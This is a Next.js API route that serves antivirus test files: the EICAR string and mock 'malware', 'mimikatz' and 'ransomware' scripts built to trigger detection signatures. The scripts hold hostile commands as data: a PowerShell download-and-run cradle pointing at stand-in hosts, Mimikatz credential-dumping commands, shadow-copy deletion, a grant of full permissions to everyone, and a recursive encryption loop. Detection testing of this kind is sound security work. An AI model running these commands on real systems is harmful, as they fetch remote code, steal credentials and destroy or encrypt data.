import { NextResponse } from 'next/server';

export async function GET(req: Request) {
    const { searchParams } = new URL(req.url);
    const type = searchParams.get('type');
    const format = searchParams.get('format') || 'txt';

    let content = '';
    let filename = '';

    // Standard EICAR string - industry standard for AV testing
    const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

    switch (type) {
        case 'eicar':
            content = EICAR;
            filename = `eicar.${format}`;
            break;
        case 'powershell':
            content = `IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload.ps1')\nInvoke-WebRequest -Uri http://malicious.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe\n\n# Trigger Gateway AV/IPS\n${EICAR}`;
            filename = `cradle.ps1`;
            break;
        case 'mimikatz':
            content = `privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\nInvoke-Mimikatz -DumpCreds\n\n:: Trigger Gateway AV/IPS\n${EICAR}`;
            filename = `mimikatz.log`;
            break;
        case 'malware':
            // Heuristic signature simulation: Script-based threats (AMSI triggers)
            // Windows Defender triggers on "Invoke-Mimikatz" instantly in .ps1/.bat files
            const malwareSignatures = `# MALWARE SIMULATION FILE
# This file contains known malicious strings to test Antivirus signatures.

Invoke-Mimikatz -DumpCreds
Get-GPPPassword
IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/payload.exe')
rundll32.exe user32.dll,LockWorkStation
`;
            content = malwareSignatures;
            filename = `suspicious_payload.${format}`;
            break;

        case 'ransomware':
            // Ransomware simulation: Script behavior + Ransom Note cues
            const ransomNote = `!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nWANACRYPT0R`;

            if (format === 'vbs') {
                // VBScript Ransomware Pattern
                content = `' ${ransomNote}\nSet shell = CreateObject("WScript.Shell")\nMsgBox "YOUR FILES ARE ENCRYPTED"\nFunction Encrypt(file)\n  ' Mock Encryption Logic\nEnd Function`;
            } else if (format === 'bat' || format === 'cmd') {
                // Batch Ransomware Pattern (Shadow Copy Deletion)
                content = `@echo off\nREM ${ransomNote}\nvssadmin.exe Delete Shadows /All /Quiet\nicacls . /grant Everyone:F /T /C /Q\n`;
            } else if (format === 'ps1') {
                // PowerShell Ransomware Pattern (Recursive Encryption)
                content = `# ${ransomNote}\n$files = Get-ChildItem -Recurse; foreach ($f in $files) { [System.IO.File]::Encrypt($f) }\n`;
            } else {
                // Text/Other: Standard Note + High Entropy
                content = `${ransomNote}\n\nKey: ${Math.floor(Math.random() * 1000000000).toString(16)}`;
            }

            filename = `ransomware_simulator.${format}`;
            break;
        default:
            return new NextResponse('Invalid Type', { status: 400 });
    }

    // Return as a downloadable file stream
    return new NextResponse(content, {
        headers: {
            'Content-Type': 'application/octet-stream',
            'Content-Disposition': `attachment; filename="${filename}"`,
        },
    });
}
